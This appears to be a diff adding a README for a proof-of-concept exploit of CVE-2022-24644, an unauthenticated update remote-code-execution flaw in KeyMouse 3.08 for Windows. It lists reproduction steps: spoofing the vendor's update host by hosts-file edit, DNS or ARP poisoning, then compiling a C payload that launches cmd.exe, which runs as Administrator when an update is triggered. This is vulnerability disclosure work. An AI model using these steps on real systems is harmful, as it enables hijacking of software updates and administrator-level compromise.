@@ -1,0 +1,31 @@
+# CVE-2022-24644
+> ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability
+
+Usage: `python3 cve-2022-24644_poc.py`
+
+Details in the report at [gerr.re](https://gerr.re/posts/cve-2022-24644/).
+
+## Steps to reproduce
+1. Install [KeyMouse Windows 3.08](http://www.keymouse.com/downloads/windows/keymouse-setup3.08.exe);
+2. Set spoof `www.keymouse.com` to our attacker ip;
+    * For the proof-of-concept it is easiest to edit `c:\windows\system32\drivers\etc\hosts` on the target.
+        - Attackers may e.g. use:
+            + poorly configured routers/switches/DNS
+            + DNS cache poisoning
+            + ARP cache poisoning
+3. Compile `proof.c` on the attacker, e.g. using `i686-w64-mingw32-gcc proof.c -o proof.exe`;
+```c
+#include <windows.h>
+int main(int argc, char const *argv[]){	
+	WinExec("cmd.exe",1);
+	return TRUE;
+}
+```
+4. Run the proof-of-concept script on the attacker;
+5. Start KeyMouse on the target and trigger an update:
+    * Application Menu: Help -> Check For Updates
+    * Task Bar: right mouse button on task bar icon -> Check Updates (or Install Updates)
+6. Continue with the update.
+
+As a result, `proof.exe` is executed in the context of the Administrator user at high integrity.
+
